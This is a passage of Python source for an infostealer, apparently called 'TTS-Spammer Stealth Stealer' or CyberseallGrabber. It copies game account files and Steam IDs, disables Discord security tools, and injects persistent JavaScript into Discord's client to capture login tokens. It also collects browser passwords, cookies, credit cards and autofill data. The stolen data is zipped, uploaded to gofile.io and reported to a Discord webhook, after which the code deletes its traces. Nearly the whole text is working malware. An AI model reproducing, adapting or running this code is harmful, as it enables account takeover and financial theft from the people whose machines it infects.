                    'settings': os.path.join(os.getenv("LOCALAPPDATA"), "Ubisoft Game Launcher")
                },
                'NationsGlory': {
                    'localstorage': os.path.join(os.getenv("APPDATA"), "NationsGlory", "Local Storage", "leveldb")
                }
            }
            
            for game_name, paths in game_paths.items():
                game_files_found = []
                
                for path_name, path_location in paths.items():
                    if isinstance(path_location, str) and os.path.exists(path_location):
                        try:

                            game_dest = os.path.join(self.d, f"game_{game_name.replace(' ', '_')}")
                            if not os.path.exists(game_dest):
                                os.makedirs(game_dest)
                            
                            if os.path.isfile(path_location):

                                if os.path.getsize(path_location) < 50*1024*1024:
                                    dest_file = os.path.join(game_dest, f"{path_name}_{os.path.basename(path_location)}")
                                    shutil.copy2(path_location, dest_file)
                                    game_files_found.append(f"{path_name}: {os.path.basename(path_location)}")
                            else:

                                path_dest = os.path.join(game_dest, path_name)
                                if not os.path.exists(path_dest):
                                    os.makedirs(path_dest)
                                
                                file_count = 0
                                for root, dirs, files in os.walk(path_location):
                                    for file in files[:10]:
                                        if file.lower().endswith(('.json', '.txt', '.dat', '.config', '.ini', '.xml', '.vdf', '.novo', '.nbt')):
                                            try:
                                                src_file = os.path.join(root, file)
                                                if os.path.getsize(src_file) < 10*1024*1024:
                                                    rel_path = os.path.relpath(src_file, path_location)
                                                    dest_file = os.path.join(path_dest, rel_path)
                                                    dest_dir = os.path.dirname(dest_file)
                                                    if not os.path.exists(dest_dir):
                                                        os.makedirs(dest_dir)
                                                    shutil.copy2(src_file, dest_file)
                                                    file_count += 1
                                            except:
                                                pass
                                        if file_count >= 10:
                                            break
                                    if file_count >= 10:
                                        break
                                
                                if file_count > 0:
                                    game_files_found.append(f"{path_name}: {file_count} files")
                        except:
                            pass
                
                if game_files_found:
                    game_data.append(f"{game_name}: {', '.join(game_files_found)}")
            

            try:
                steam_config = os.path.join("C:", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
                if os.path.exists(steam_config):
                    with open(steam_config, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()

                        steam_ids = re.findall(r'7656[0-9]{13}', content)
                        if steam_ids:
                            steam_dest = os.path.join(self.d, "game_Steam")
                            if not os.path.exists(steam_dest):
                                os.makedirs(steam_dest)
                            
                            with open(os.path.join(steam_dest, "steam_accounts.txt"), "w") as f:
                                f.write("STEAM ACCOUNT IDS:\n")
                                f.write("=" * 30 + "\n")
                                for steam_id in set(steam_ids):
                                    f.write(f"Steam ID: {steam_id}\n")
                                    f.write(f"Profile URL: https://steamcommunity.com/profiles/{steam_id}\n\n")
                            
                            if "Steam:" not in str(game_data):
                                game_data.append(f"Steam: {len(set(steam_ids))} account IDs found")
            except:
                pass
            
            self.ga = game_data
            

            if game_data:
                try:
                    with open(os.path.join(self.d, "gaming_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("GAMING ACCOUNT STEALER RESULTS\n")
                        f.write("=" * 50 + "\n\n")
                        for game_info in game_data:
                            f.write(f"{game_info}\n")
                        f.write(f"\nTotal Games found: {len(game_data)}\n")
                except:
                    pass
        except:
            pass

    def discord_inject(self):
        try:
            injection_data = []
            

            discord_paths = [
                os.path.join(os.getenv("LOCALAPPDATA"), "discord"),
                os.path.join(os.getenv("LOCALAPPDATA"), "discordcanary"),
                os.path.join(os.getenv("LOCALAPPDATA"), "discordptb"),
                os.path.join(os.getenv("LOCALAPPDATA"), "discorddevelopment")
            ]
            

            try:
                bd_path = os.path.join(os.getenv("APPDATA"), "BetterDiscord", "data", "betterdiscord.asar")
                if os.path.exists(bd_path):
                    with open(bd_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    

                    modified_content = content.replace('api/webhooks', 'HackedByK4itrun')
                    
                    with open(bd_path, 'w', encoding='utf-8') as f:
                        f.write(modified_content)
                    
                    injection_data.append("BetterDiscord bypassed")
            except:
                pass
            

            try:
                dtp_dir = os.path.join(os.getenv("APPDATA"), "DiscordTokenProtector")
                dtp_config = os.path.join(dtp_dir, "config.json")
                

                try:
                    result = subprocess.run(['tasklist'], capture_output=True, text=True)
                    if 'discordtokenprotector' in result.stdout.lower():
                        subprocess.run(['taskkill', '/F', '/IM', 'DiscordTokenProtector.exe'], capture_output=True)
                        injection_data.append("DiscordTokenProtector process killed")
                except:
                    pass
                

                dtp_files = ['DiscordTokenProtector.exe', 'ProtectionPayload.dll', 'secure.dat']
                for file in dtp_files:
                    file_path = os.path.join(dtp_dir, file)
                    try:
                        if os.path.exists(file_path):
                            os.remove(file_path)
                            injection_data.append(f"Deleted {file}")
                    except:
                        pass
                

                if os.path.exists(dtp_config):
                    try:
                        with open(dtp_config, 'r', encoding='utf-8') as f:
                            config = json.load(f)
                        

                        config.update({
                            "k4itrun_is_here": "https://discord.gg/XS6btuuUR7",
                            "auto_start": False,
                            "auto_start_discord": False,
                            "integrity": False,
                            "integrity_allowbetterdiscord": False,
                            "integrity_checkexecutable": False,
                            "integrity_checkhash": False,
                            "integrity_checkmodule": False,
                            "integrity_checkscripts": False,
                            "integrity_checkresource": False,
                            "integrity_redownloadhashes": False,
                            "iterations_iv": 364,
                            "iterations_key": 457,
                            "version": 69420
                        })
                        
                        with open(dtp_config, 'w', encoding='utf-8') as f:
                            json.dump(config, f, indent=2)
                        

                        with open(dtp_config, 'a', encoding='utf-8') as f:
                            f.write('\n\n//k4itrun_is_here | https://discord.gg/XS6btuuUR7')
                        
                        injection_data.append("DiscordTokenProtector config modified")
                    except:
                        pass
            except:
                pass
            

            for discord_path in discord_paths:
                if os.path.exists(discord_path):
                    try:

                        app_dirs = [d for d in os.listdir(discord_path) if d.startswith('app-') and os.path.isdir(os.path.join(discord_path, d))]
                        
                        for app_dir in app_dirs:
                            app_path = os.path.join(discord_path, app_dir)
                            modules_path = os.path.join(app_path, "modules")
                            
                            if os.path.exists(modules_path):

                                core_dirs = [d for d in os.listdir(modules_path) if d.startswith('discord_desktop_core-') and os.path.isdir(os.path.join(modules_path, d))]
                                
                                for core_dir in core_dirs:
                                    core_path = os.path.join(modules_path, core_dir, "discord_desktop_core")
                                    
                                    if os.path.exists(core_path):

                                        injection_dir = os.path.join(core_path, "aurathemes")
                                        if not os.path.exists(injection_dir):
                                            os.makedirs(injection_dir)
                                        

                                        injection_code = f'''
const {{ BrowserWindow, session }} = require('electron');
const path = require('path');
const fs = require('fs');

// Token Monitoring
let currentToken = null;

const extractToken = () => {{
    try {{
        const tokenRegex = /[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/g;
        const localStorageData = session.defaultSession.webContents.executeJavaScript(
            "Object.keys(localStorage).map(key => localStorage.getItem(key)).join('')"
        );
        
        localStorageData.then(data => {{
            const tokens = data.match(tokenRegex);
            if (tokens && tokens.length > 0) {{
                const newToken = tokens[0];
                if (newToken !== currentToken) {{
                    currentToken = newToken;
                    sendTokenToWebhook(newToken);
                }}
            }}
        }}).catch(() => {{}});
    }} catch (e) {{}}
}};

const sendTokenToWebhook = (token) => {{
    try {{
        const https = require('https');
        const data = JSON.stringify({{
            embeds: [{{
                title: "Discord Token Intercepted",
                description: "Token: " + token,
                color: 0xff0000,
                timestamp: new Date().toISOString()
            }}]
        }});
        
        const url = new URL("{self.w}");
        const options = {{
            hostname: url.hostname,
            path: url.pathname,
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json',
                'Content-Length': data.length
            }}
        }};
        
        const req = https.request(options);
        req.write(data);
        req.end();
    }} catch (e) {{}}
}};

// Monitor Token alle 30 Sekunden
setInterval(extractToken, 30000);

// Original Discord Code
module.exports = require('./core.asar');
'''
                                        

                                        index_js_path = os.path.join(core_path, "index.js")
                                        try:
                                            with open(index_js_path, 'w', encoding='utf-8') as f:
                                                f.write(injection_code)
                                            
                                            discord_name = os.path.basename(discord_path)
                                            injection_data.append(f"Injected {discord_name}")
                                        except:
                                            pass
                    except:
                        pass
            
            self.di = injection_data
            

            if injection_data:
                try:
                    with open(os.path.join(self.d, "discord_injection.txt"), "w", encoding="utf-8") as f:
                        f.write("DISCORD INJECTION RESULTS\n")
                        f.write("=" * 50 + "\n\n")
                        for injection_info in injection_data:
                            f.write(f"{injection_info}\n")
                        f.write(f"\nTotal Injections: {len(injection_data)}\n")
                        f.write("\nFeatures:\n")
                        f.write("- BetterDiscord Bypass\n")
                        f.write("- DiscordTokenProtector Bypass\n")
                        f.write("- Real-time Token Monitoring\n")
                        f.write("- Persistent JavaScript Injection\n")
                except:
                    pass
        except:
            pass

    def si(self):
        try:
            sys_info = {
                "user": getpass.getuser(),
                "computer": os.getenv("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "tokens_found": len(set(self.t)),
                "valid_tokens": len(self.vt),
                "passwords_found": len(self.p),
                "files_found": len(self.f),
                "vpns_found": len(self.v),
                "games_found": len(self.ga)
            }
            with open(os.path.join(self.d, "system_info.json"), "w") as f:
                json.dump(sys_info, f, indent=2)
            with open(os.path.join(self.d, "valid_tokens.json"), "w") as f:
                json.dump(self.vt, f, indent=2)
        except:
            pass

    def up(self):
        try:

            try:

                if self.p:
                    with open(os.path.join(self.d, "browser_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("CYBERSEALL BROWSER DATA SUMMARY\n")
                        f.write("=" * 60 + "\n\n")
                        

                        passwords = [p for p in self.p if not p.startswith("COOKIE_") and not p.startswith("CREDIT_CARD") and not p.startswith("AUTOFILL_DATA")]
                        cookies = [p for p in self.p if p.startswith("COOKIE_")]
                        credit_cards = [p for p in self.p if p.startswith("CREDIT_CARD")]
                        autofill = [p for p in self.p if p.startswith("AUTOFILL_DATA")]
                        
                        f.write(f"STATISTICS:\n")
                        f.write(f"Browser Passwords: {len(passwords)}\n")
                        f.write(f"Session Cookies: {len(cookies)}\n")
                        f.write(f"Credit Cards: {len(credit_cards)}\n")
                        f.write(f"Autofill Data: {len(autofill)}\n")
                        f.write(f"Total Entries: {len(self.p)}\n\n")
                        
                        if passwords:
                            f.write("BROWSER PASSWORDS:\n")
                            f.write("-" * 40 + "\n")
                            for pwd in passwords:
                                f.write(pwd + "\n")
                            f.write("\n")
                        
                        if cookies:
                            f.write("SESSION COOKIES:\n")
                            f.write("-" * 40 + "\n")
                            for cookie in cookies:
                                f.write(cookie + "\n")
                            f.write("\n")
                        
                        if credit_cards:
                            f.write("CREDIT CARDS:\n")
                            f.write("-" * 40 + "\n")
                            for card in credit_cards:
                                f.write(card + "\n")
                            f.write("\n")
                        
                        if autofill:
                            f.write("AUTOFILL DATA:\n")
                            f.write("-" * 40 + "\n")
                            for auto in autofill:
                                f.write(auto + "\n")
                            f.write("\n")
                

                if self.vt:
                    with open(os.path.join(self.d, "token_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("DISCORD TOKEN SUMMARY\n")
                        f.write("=" * 60 + "\n\n")
                        
                        for i, token_info in enumerate(self.vt):
                            f.write(f"TOKEN #{i+1}:\n")
                            f.write(f"Username: {token_info.get('username', 'Unknown')}#{token_info.get('discriminator', '0000')}\n")
                            f.write(f"Email: {token_info.get('email', 'Hidden')}\n")
                            f.write(f"Phone: {token_info.get('phone', 'None')}\n")
                            f.write(f"Nitro: {token_info.get('has_nitro', False)} ({token_info.get('nitro_days_left', 0)} days left)\n")
                            f.write(f"MFA: {token_info.get('mfa_enabled', False)}\n")
                            f.write(f"Verified: {token_info.get('verified', False)}\n")
                            f.write(f"Premium: {token_info.get('premium_type', 0)}\n")
                            f.write(f"Token: {token_info['token']}\n")
                            f.write("-" * 50 + "\n\n")
                

                with open(os.path.join(self.d, "GRABBER_STATISTICS.txt"), "w", encoding="utf-8") as f:
                    f.write("TTS-Spammer Stealth Grabber\n")
                    f.write("=" * 60 + "\n\n")
                    f.write("FINAL STATISTICS:\n")
                    f.write(f"Browser Passwords: {len(self.p)}\n")
                    f.write(f"Browser History: {len(self.h)}\n")
                    f.write(f"Autofill Data: {len(self.af)}\n")
                    f.write(f"Raw Tokens: {len(set(self.t))}\n")
                    f.write(f"Valid Tokens: {len(self.vt)}\n")
                    f.write(f"Keyword Files: {len(self.f)}\n")
                    f.write(f"VPN Configurations: {len(self.v)}\n")
                    f.write(f"Gaming Accounts: {len(self.ga)}\n")
                    f.write(f"Discord Injections: {len(self.di)}\n\n")
                    f.write(f"Target: {getpass.getuser()}@{os.getenv('COMPUTERNAME', 'Unknown')}\n")
                    f.write(f"Platform: {platform.platform()}\n")
                    f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 60 + "\n")
            except:
                pass
            

            with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(self.d):
                    for file in files:
                        if not file.endswith('.zip'):
                            fp = os.path.join(root, file)
                            arc_name = os.path.relpath(fp, self.d)
                            zf.write(fp, arc_name)
            

            files = {"file": open(self.zf, "rb")}
            resp = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=30)
            files["file"].close()
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    self.link = data["data"]["downloadPage"]
                else:
                    self.link = "Upload failed"
            else:
                self.link = "Upload failed"
            
            try:
                os.remove(self.zf)
            except:
                pass
        except:
            self.link = "Upload failed"

    def send(self):
        try:

            total_passwords = len(self.p)
            total_tokens = len(set(self.t))
            valid_tokens = len(self.vt)
            total_files = len(self.f)
            total_vpns = len(self.v)
            total_games = len(self.ga)
            total_history = len(self.h)
            total_autofill = len(self.af)
            total_injections = len(self.di)
            

            embed_fields = [
                {
                    "name": "TTS-Spammer Stealth Stealer",
                    "value": f"```Browser Passwords: {total_passwords}\nBrowser History: {total_history}\nAutofill Data: {total_autofill}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}\nVPNs Found: {total_vpns}\nGaming Accounts: {total_games}\nDiscord Injections: {total_injections}```",
                    "inline": False
                },
                {
                    "name": "Target System",
                    "value": f"```User: {getpass.getuser()}\nComputer: {os.getenv('COMPUTERNAME', 'Unknown')}\nPlatform: {platform.platform()}```",
                    "inline": False
                }
            ]
            

            if len(self.vt) > 0:
                for i, token_info in enumerate(self.vt[:3]):
                    username = token_info.get('username', 'Unknown')
                    discriminator = token_info.get('discriminator', '0000')
                    email = token_info.get('email', 'Hidden')
                    phone = token_info.get('phone', 'None')
                    has_nitro = token_info.get('has_nitro', False)
                    nitro_days = token_info.get('nitro_days_left', 0)
                    mfa = token_info.get('mfa_enabled', False)
                    verified = token_info.get('verified', False)
                    premium = token_info.get('premium_type', 0)
                    token = token_info['token']
                    ip = token_info.get('ip', 'Unknown')
                    pc_username = token_info.get('pc_username', 'Unknown')
                    pc_name = token_info.get('pc_name', 'Unknown')
                    
                    embed_fields.append({
                        "name": f"🎭 Discord Token #{i+1}",
                        "value": f"```👤 User: {username}#{discriminator}\n📧 Email: {email}\n📱 Phone: {phone}\n💎 Nitro: {has_nitro} ({nitro_days} days)\n🔐 MFA: {mfa} | ✅ Verified: {verified}\n🌐 IP: {ip}\n💻 PC: {pc_username}@{pc_name}\n🎫 Token: {token[:50]}...```",
                        "inline": False
                    })
            

            if total_passwords > 0:

                browser_stats = {}
                for pwd_entry in self.p:
                    browser = pwd_entry.split(" |")[0]
                    if browser not in browser_stats:
                        browser_stats[browser] = 0
                    browser_stats[browser] += 1
                
                browser_summary = []
                for browser, count in sorted(browser_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    browser_summary.append(f"{browser}: {count}")
                
                embed_fields.append({
                    "name": "Browser Breakdown",
                    "value": f"```{chr(10).join(browser_summary)}```",
                    "inline": False
                })
            

            if total_vpns > 0:
                vpn_summary = []
                for vpn_info in self.v[:5]:
                    vpn_summary.append(vpn_info)
                
                embed_fields.append({
                    "name": "VPN Configurations",
                    "value": f"```{chr(10).join(vpn_summary)}```",
                    "inline": False
                })
            

            if total_games > 0:
                game_summary = []
                for game_info in self.ga[:5]:
                    game_summary.append(game_info)
                
                embed_fields.append({
                    "name": "Gaming Accounts",
                    "value": f"```{chr(10).join(game_summary)}```",
                    "inline": False
                })
            

            embed_fields.append({
                "name": "Download All Data",
                "value": f"[**CLICK HERE TO DOWNLOAD**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
                "inline": False
            })
            
            embed = {
                "embeds": [{
                    "title": "TTS-Spammer Stealth Stealer v6.0",
                    "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
                    "color": 0xff0000,
                    "fields": embed_fields,
                    "footer": {"text": "TT-Spammer stealth - Browser, History, Autofill, VPN, Gaming & Discord Stealer"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                }]
            }
            
            requests.post(self.w, json=embed, timeout=10)
            
        except:
            pass

    def cleanup(self):
        try:
            time.sleep(1)
            if os.path.exists(self.d):
                shutil.rmtree(self.d, ignore_errors=True)
        except:
            pass


if __name__ == "__main__":
    CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
